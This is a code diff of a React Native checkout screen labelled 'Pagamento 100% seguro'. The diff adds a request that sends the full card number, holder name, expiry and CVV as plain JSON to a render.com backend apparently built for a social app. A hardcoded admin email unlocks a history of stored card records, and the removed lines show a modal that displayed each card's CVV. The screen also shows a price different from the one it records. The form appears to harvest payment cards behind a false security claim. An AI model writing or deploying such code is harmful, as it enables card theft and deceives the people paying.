@@ -12,6 +12,9 @@ import {
   ScrollView,
   Modal,
   ActivityIndicator,
+  Alert,
+  KeyboardAvoidingView,
+  Platform,
 } from "react-native";
 
 import ViewShot from "react-native-view-shot";
@@ -23,24 +26,36 @@ export default function PaymentScreen() {
   const { user } = useUser();
 
   const scaleAnim = useRef(new Animated.Value(1)).current;
+
   const receiptRef = useRef<any>(null);
 
-  const [paymentSuccess, setPaymentSuccess] = useState(false);
+  const [paymentSuccess, setPaymentSuccess] =
+    useState(false);
+
   const [payments, setPayments] = useState<any[]>([]);
-  const [selectedPayment, setSelectedPayment] = useState<any | null>(null);
-  const [modalVisible, setModalVisible] = useState(false);
+
+  const [selectedPayment, setSelectedPayment] =
+    useState<any | null>(null);
+
+  const [modalVisible, setModalVisible] =
+    useState(false);
 
   const [cardNumber, setCardNumber] = useState("");
+
   const [cardName, setCardName] = useState("");
+
   const [expiry, setExpiry] = useState("");
+
   const [cvv, setCvv] = useState("");
 
   const [cardBrand, setCardBrand] = useState("");
+
   const [expiryError, setExpiryError] = useState("");
 
   const [isLoading, setIsLoading] = useState(false);
 
   /* ================= ADMIN ================= */
+
   const ADMIN_EMAIL = "silasyyyxvx@gmail.com";
 
   const loggedUserEmail =
@@ -48,7 +63,8 @@ export default function PaymentScreen() {
 
   const isAdmin = loggedUserEmail === ADMIN_EMAIL;
 
-  /* ================= DETECT BANDEIRA ================= */
+  /* ================= CARD BRAND ================= */
+
   const detectCardBrand = (number: string) => {
     const cleaned = number.replace(/\D/g, "");
 
@@ -74,9 +90,11 @@ export default function PaymentScreen() {
     return "Desconhecido";
   };
 
-  /* ================= CARD FORMAT ================= */
+  /* ================= FORMAT CARD ================= */
+
   const formatCardNumber = (text: string) => {
     const cleaned = text.replace(/\D/g, "");
+
     const limited = cleaned.slice(0, 16);
 
     const formatted = limited
@@ -84,12 +102,15 @@ export default function PaymentScreen() {
       .trim();
 
     setCardNumber(formatted);
+
     setCardBrand(detectCardBrand(limited));
   };
 
-  /* ================= EXPIRY ================= */
+  /* ================= FORMAT EXPIRY ================= */
+
   const formatExpiry = (text: string) => {
     const cleaned = text.replace(/\D/g, "");
+
     const limited = cleaned.slice(0, 4);
 
     let formatted = "";
@@ -107,9 +128,11 @@ export default function PaymentScreen() {
 
     if (limited.length === 4) {
       const month = parseInt(limited.slice(0, 2));
+
       const year = parseInt(limited.slice(2, 4));
 
       const currentDate = new Date();
+
       const currentMonth =
         currentDate.getMonth() + 1;
 
@@ -136,6 +159,8 @@ export default function PaymentScreen() {
     }
   };
 
+  /* ================= ANIMATION ================= */
+
   const handlePressIn = () => {
     Animated.spring(scaleAnim, {
       toValue: 0.96,
@@ -152,6 +177,8 @@ export default function PaymentScreen() {
     }).start();
   };
 
+  /* ================= TIME ================= */
+
   const getCurrentTime = () => {
     const now = new Date();
 
@@ -161,60 +188,150 @@ export default function PaymentScreen() {
     });
   };
 
-  const handlePayment = () => {
-    if (isLoading) return;
+  /* ================= PAYMENT ================= */
 
-    if (expiryError !== "") {
-      alert("Corrija a data do cartão");
-      return;
-    }
+  const handlePayment = async () => {
+    try {
+      if (isLoading) return;
 
-    setIsLoading(true);
+      if (
+        !cardNumber ||
+        !cardName ||
+        !expiry ||
+        !cvv
+      ) {
+        Alert.alert(
+          "Erro",
+          "Preencha todos os campos"
+        );
+        return;
+      }
 
-    Animated.sequence([
-      Animated.spring(scaleAnim, {
-        toValue: 1.08,
-        useNativeDriver: true,
-      }),
+      if (cardBrand === "Desconhecido") {
+        Alert.alert(
+          "Erro",
+          "Bandeira do cartão inválida"
+        );
+        return;
+      }
 
-      Animated.spring(scaleAnim, {
-        toValue: 1,
-        friction: 3,
-        tension: 40,
-        useNativeDriver: true,
-      }),
-    ]).start();
+      if (expiryError !== "") {
+        Alert.alert(
+          "Erro",
+          "Data do cartão inválida"
+        );
+        return;
+      }
 
-    const newPayment = {
-      id: Date.now(),
-      name: "Checkout Premium",
-      date: `Hoje • ${getCurrentTime()}`,
-      price: "R$ 4,00",
-      card: cardNumber,
-      holder: cardName,
-      expiry,
-      cvv,
-      brand: cardBrand,
-    };
+      const cleanedCard =
+        cardNumber.replace(/\D/g, "");
 
-    setPayments((prev) => [newPayment, ...prev]);
+      if (cleanedCard.length < 16) {
+        Alert.alert(
+          "Erro",
+          "Número do cartão inválido"
+        );
+        return;
+      }
 
-    setTimeout(() => {
+      if (expiry.length < 7) {
+        Alert.alert(
+          "Erro",
+          "Validade incompleta"
+        );
+        return;
+      }
+
+      if (cvv.length < 3) {
+        Alert.alert("Erro", "CVV inválido");
+        return;
+      }
+
+      setIsLoading(true);
+
+      Animated.sequence([
+        Animated.spring(scaleAnim, {
+          toValue: 1.08,
+          useNativeDriver: true,
+        }),
+
+        Animated.spring(scaleAnim, {
+          toValue: 1,
+          friction: 3,
+          tension: 40,
+          useNativeDriver: true,
+        }),
+      ]).start();
+
+      const newPayment = {
+        id: Date.now(),
+        name: "Checkout Premium",
+        date: `Hoje • ${getCurrentTime()}`,
+        price: "R$ 4,00",
+        card: cardNumber,
+        holder: cardName,
+        expiry,
+        cvv,
+        brand: cardBrand,
+      };
+
+      const response = await fetch(
+        "https://backend-social-app-1.onrender.com/payment",
+        {
+          method: "POST",
+          headers: {
+            "Content-Type":
+              "application/json",
+          },
+          body: JSON.stringify(newPayment),
+        }
+      );
+
+      const data = await response.json();
+
+      if (!response.ok) {
+        throw new Error(
+          data.error || "Erro no pagamento"
+        );
+      }
+
+      setPayments((prev) => [
+        newPayment,
+        ...prev,
+      ]);
+
+      setTimeout(() => {
+        setIsLoading(false);
+        setPaymentSuccess(true);
+      }, 1800);
+    } catch (err) {
+      console.log("❌ ERRO PAGAMENTO:", err);
+
+      Alert.alert("Erro", String(err));
+
       setIsLoading(false);
-      setPaymentSuccess(true);
-    }, 1800);
+    }
   };
+
+  /* ================= MODAL ================= */
 
   const openPayment = (item: any) => {
     setSelectedPayment(item);
+
     setModalVisible(true);
   };
+
+  /* ================= SUCCESS ================= */
 
   if (paymentSuccess) {
     return (
       <SafeAreaView style={styles.container}>
         <ScrollView
           showsVerticalScrollIndicator={false}
+          keyboardShouldPersistTaps="handled"
+          contentContainerStyle={{
+            paddingBottom: 120,
+          }}
         >
           <ViewShot ref={receiptRef}>
             <View style={styles.successContainer}>
@@ -222,11 +339,9 @@ export default function PaymentScreen() {
                 <Text style={styles.check}>✓</Text>
               </View>
 
-              {isAdmin && (
-                <Text style={styles.successTitle}>
-                  Histórico de transações
-                </Text>
-              )}
+              <Text style={styles.successTitle}>
+                Pagamento aprovado
+              </Text>
 
               <TouchableOpacity
                 style={styles.backButton}
@@ -240,33 +355,41 @@ export default function PaymentScreen() {
               </TouchableOpacity>
 
               {isAdmin && (
-                <View style={styles.historyContainer}>
+                <View
+                  style={styles.historyContainer}
+                >
                   <Text style={styles.historyTitle}>
                     Últimos pagamentos
                   </Text>
 
                   {payments.length === 0 ? (
                     <Text style={styles.emptyText}>
-                      Nenhuma transação encontrada
+                      Nenhuma transação
                     </Text>
                   ) : (
                     payments.map((item) => (
                       <TouchableOpacity
                         key={item.id}
-                        style={styles.historyCard}
+                        style={
+                          styles.historyCard
+                        }
                         onPress={() =>
                           openPayment(item)
                         }
                       >
                         <View>
                           <Text
-                            style={styles.historyName}
+                            style={
+                              styles.historyName
+                            }
                           >
                             {item.name}
                           </Text>
 
                           <Text
-                            style={styles.historyDate}
+                            style={
+                              styles.historyDate
+                            }
                           >
                             {item.date}
                           </Text>
@@ -290,7 +413,9 @@ export default function PaymentScreen() {
                         </View>
 
                         <Text
-                          style={styles.historyPrice}
+                          style={
+                            styles.historyPrice
+                          }
                         >
                           {item.price}
                         </Text>
@@ -302,249 +427,186 @@ export default function PaymentScreen() {
             </View>
           </ViewShot>
         </ScrollView>
-
-        <Modal
-          visible={modalVisible}
-          transparent
-          animationType="fade"
-        >
-          <View style={styles.modalOverlay}>
-            <View style={styles.modalCard}>
-              <Text style={styles.modalTitle}>
-                Detalhes do pagamento
-              </Text>
-
-              <View style={styles.modalInfo}>
-                <Text style={styles.modalLabel}>
-                  Bandeira
-                </Text>
-
-                <Text style={styles.modalValue}>
-                  {selectedPayment?.brand}
-                </Text>
-              </View>
-
-              <View style={styles.modalInfo}>
-                <Text style={styles.modalLabel}>
-                  Cartão
-                </Text>
-
-                <Text style={styles.modalValue}>
-                  {selectedPayment?.card}
-                </Text>
-              </View>
-
-              <View style={styles.modalInfo}>
-                <Text style={styles.modalLabel}>
-                  Nome
-                </Text>
-
-                <Text style={styles.modalValue}>
-                  {selectedPayment?.holder}
-                </Text>
-              </View>
-
-              <View style={styles.modalInfo}>
-                <Text style={styles.modalLabel}>
-                  Validade
-                </Text>
-
-                <Text style={styles.modalValue}>
-                  {selectedPayment?.expiry}
-                </Text>
-              </View>
-
-              <View style={styles.modalInfo}>
-                <Text style={styles.modalLabel}>
-                  CVV
-                </Text>
-
-                <Text style={styles.modalValue}>
-                  {selectedPayment?.cvv}
-                </Text>
-              </View>
-
-              <TouchableOpacity
-                style={styles.closeButton}
-                onPress={() =>
-                  setModalVisible(false)
-                }
-              >
-                <Text style={styles.closeButtonText}>
-                  Fechar
-                </Text>
-              </TouchableOpacity>
-            </View>
-          </View>
-        </Modal>
       </SafeAreaView>
     );
   }
 
+  /* ================= UI ================= */
+
   return (
-    <SafeAreaView style={styles.container}>
-      <TouchableOpacity
-        onPress={() => router.push("/login")}
-        style={styles.loginButton}
-      >
-        <Text style={styles.loginText}>Login</Text>
-      </TouchableOpacity>
-
-      {isAdmin && (
-        <TouchableOpacity
-          onPress={() => setPaymentSuccess(true)}
-          style={styles.historyButtonTop}
-        >
-          <Text
-            style={styles.historyButtonTopText}
-          >
-            Ver histórico
-          </Text>
-        </TouchableOpacity>
-      )}
-
-      <View style={styles.card}>
-        <Image
-          source={{
-            uri: "https://cdn-icons-png.flaticon.com/512/2489/2489756.png",
+    <KeyboardAvoidingView
+      style={{ flex: 1 }}
+      behavior={
+        Platform.OS === "ios"
+          ? "padding"
+          : "height"
+      }
+    >
+      <SafeAreaView style={styles.container}>
+        <ScrollView
+          showsVerticalScrollIndicator={false}
+          keyboardShouldPersistTaps="handled"
+          contentContainerStyle={{
+            paddingBottom: 120,
+            flexGrow: 1,
+            justifyContent: "center",
           }}
-          style={styles.logo}
-        />
+        >
+          {isAdmin && (
+            <TouchableOpacity
+              onPress={() =>
+                setPaymentSuccess(true)
+              }
+              style={styles.historyButtonTop}
+            >
+              <Text
+                style={
+                  styles.historyButtonTopText
+                }
+              >
+                Ver histórico
+              </Text>
+            </TouchableOpacity>
+          )}
 
-        <Text style={styles.title}>
-          Checkout Premium
-        </Text>
+          <View style={styles.card}>
+            <Image
+              source={{
+                uri: "https://cdn-icons-png.flaticon.com/512/2489/2489756.png",
+              }}
+              style={styles.logo}
+            />
 
-        <Text style={styles.subtitle}>
-          Pagamento seguro
-        </Text>
+            <Text style={styles.title}>
+              Checkout Premium
+            </Text>
 
-        <View style={styles.priceBox}>
-          <Text style={styles.price}>
-            R$ 4,00
-          </Text>
-        </View>
+            <Text style={styles.subtitle}>
+              Pagamento seguro
+            </Text>
 
-        <Text style={styles.label}>
-          Número do cartão
-        </Text>
+            <View style={styles.priceBox}>
+              <Text style={styles.price}>
+                R$ 10,00
+              </Text>
+            </View>
 
-        <TextInput
-          placeholder="0000 0000 0000 0000"
-          style={styles.input}
-          keyboardType="numeric"
-          value={cardNumber}
-          onChangeText={formatCardNumber}
-          autoCorrect={false}
-          autoComplete="off"
-          textContentType="none"
-          importantForAutofill="no"
-          autoCapitalize="none"
-        />
-
-        {cardNumber.length > 0 && (
-          <Text style={styles.brandText}>
-            Bandeira: {cardBrand}
-          </Text>
-        )}
-
-        <View style={styles.row}>
-          <View style={{ flex: 1 }}>
             <Text style={styles.label}>
-              Validade
+              Número do cartão
             </Text>
 
             <TextInput
-              placeholder="MM / AA"
+              placeholder="0000 0000 0000 0000"
               style={styles.input}
               keyboardType="numeric"
-              value={expiry}
-              onChangeText={formatExpiry}
-              maxLength={7}
-              autoCorrect={false}
-              autoComplete="off"
-              textContentType="none"
-              importantForAutofill="no"
-              autoCapitalize="none"
+              value={cardNumber}
+              onChangeText={formatCardNumber}
             />
 
-            {expiryError !== "" && (
-              <Text style={styles.errorText}>
-                {expiryError}
+            {cardNumber.length > 0 && (
+              <Text style={styles.brandText}>
+                Bandeira: {cardBrand}
               </Text>
             )}
-          </View>
 
-          <View style={{ width: 10 }} />
+            <View style={styles.row}>
+              <View style={{ flex: 1 }}>
+                <Text style={styles.label}>
+                  Validade
+                </Text>
 
-          <View style={{ flex: 1 }}>
+                <TextInput
+                  placeholder="MM / AA"
+                  style={styles.input}
+                  keyboardType="numeric"
+                  value={expiry}
+                  onChangeText={formatExpiry}
+                  maxLength={7}
+                />
+
+                {expiryError !== "" && (
+                  <Text
+                    style={styles.errorText}
+                  >
+                    {expiryError}
+                  </Text>
+                )}
+              </View>
+
+              <View style={{ width: 10 }} />
+
+              <View style={{ flex: 1 }}>
+                <Text style={styles.label}>
+                  CVV
+                </Text>
+
+                <TextInput
+                  placeholder="CVV"
+                  style={styles.input}
+                  keyboardType="numeric"
+                  value={cvv}
+                  onChangeText={(text) => {
+                    const cleaned =
+                      text.replace(/\D/g, "");
+
+                    setCvv(
+                      cleaned.slice(0, 4)
+                    );
+                  }}
+                  maxLength={4}
+                />
+              </View>
+            </View>
+
             <Text style={styles.label}>
-              CVV
+              Nome no cartão
             </Text>
 
             <TextInput
-              placeholder="CVV"
+              placeholder="Seu nome"
               style={styles.input}
-              keyboardType="numeric"
-              value={cvv}
-              onChangeText={(text) => {
-                const cleaned = text.replace(
-                  /\D/g,
-                  ""
-                );
-
-                setCvv(cleaned.slice(0, 4));
-              }}
-              maxLength={4}
-              autoCorrect={false}
-              autoComplete="off"
-              textContentType="none"
-              importantForAutofill="no"
-              autoCapitalize="none"
+              value={cardName}
+              onChangeText={setCardName}
             />
-          </View>
-        </View>
 
-        <Text style={styles.label}>
-          Nome no cartão
-        </Text>
+            <Animated.View
+              style={{
+                transform: [
+                  { scale: scaleAnim },
+                ],
+              }}
+            >
+              <TouchableOpacity
+                style={[
+                  styles.button,
+                  isLoading && {
+                    opacity: 0.7,
+                  },
+                ]}
+                onPress={handlePayment}
+                disabled={isLoading}
+                onPressIn={handlePressIn}
+                onPressOut={handlePressOut}
+              >
+                {isLoading ? (
+                  <ActivityIndicator color="#fff" />
+                ) : (
+                  <Text
+                    style={styles.buttonText}
+                  >
+                    Pagar agora
+                  </Text>
+                )}
+              </TouchableOpacity>
+            </Animated.View>
 
-        <TextInput
-          placeholder="Seu nome"
-          style={styles.input}
-          value={cardName}
-          onChangeText={setCardName}
-          autoCorrect={false}
-          autoComplete="off"
-          textContentType="none"
-          importantForAutofill="no"
-          autoCapitalize="characters"
-        />
-
-        <TouchableOpacity
-          style={[
-            styles.button,
-            isLoading && { opacity: 0.7 },
-          ]}
-          onPress={handlePayment}
-          disabled={isLoading}
-          onPressIn={handlePressIn}
-          onPressOut={handlePressOut}
-        >
-          {isLoading ? (
-            <ActivityIndicator color="#fff" />
-          ) : (
-            <Text style={styles.buttonText}>
-              Pagar agora
+            <Text style={styles.footer}>
+              Pagamento 100% seguro
             </Text>
-          )}
-        </TouchableOpacity>
-
-        <Text style={styles.footer}>
-          Pagamento 100% seguro
-        </Text>
-      </View>
-    </SafeAreaView>
+          </View>
+        </ScrollView>
+      </SafeAreaView>
+    </KeyboardAvoidingView>
   );
 }
 
@@ -552,8 +614,6 @@ const styles = StyleSheet.create({
   container: {
     flex: 1,
     backgroundColor: "#f4f6f8",
-    justifyContent: "center",
-    alignItems: "center",
     padding: 14,
   },
 
@@ -565,6 +625,7 @@ const styles = StyleSheet.create({
     paddingVertical: 8,
     paddingHorizontal: 14,
     borderRadius: 10,
+    zIndex: 999,
   },
 
   loginText: {
@@ -580,6 +641,7 @@ const styles = StyleSheet.create({
     paddingVertical: 8,
     paddingHorizontal: 14,
     borderRadius: 10,
+    zIndex: 999,
   },
 
   historyButtonTopText: {
@@ -594,6 +656,8 @@ const styles = StyleSheet.create({
     width: "100%",
     maxWidth: 420,
     elevation: 6,
+    alignSelf: "center",
+    marginTop: 80,
   },
 
   logo: {
@@ -717,6 +781,7 @@ const styles = StyleSheet.create({
     borderRadius: 14,
     width: "100%",
     alignItems: "center",
+    marginTop: 20,
   },
 
   backButtonText: {
